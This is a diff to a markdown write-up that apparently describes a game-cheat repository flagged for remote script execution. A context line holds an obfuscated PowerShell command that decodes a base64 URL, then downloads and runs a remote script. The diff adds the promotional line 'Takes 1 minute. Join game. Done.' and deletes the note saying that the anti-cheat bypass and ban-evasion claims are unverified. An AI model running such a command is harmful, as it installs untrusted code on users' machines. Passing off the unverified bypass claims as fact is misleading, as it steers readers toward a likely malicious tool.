@@ -33,6 +33,8 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 ```
 - Open the in-game overlay using the configured hotkey and configure settings in menu
 
+Takes 1 minute. Join game. Done.
+
 **Repository indicators:** remote script execution, administrator permissions, executable loaders and claims of instant installation.
 
 ---
@@ -58,8 +60,6 @@ BattlEye:                 BYPASSED
 Anti-Cheat Detection:     UNDETECTED
 Hardware Ban Evasion:     SUPPORTED
 ```
-
-These are advertised claims, not independently verified results.
 
 ---
 
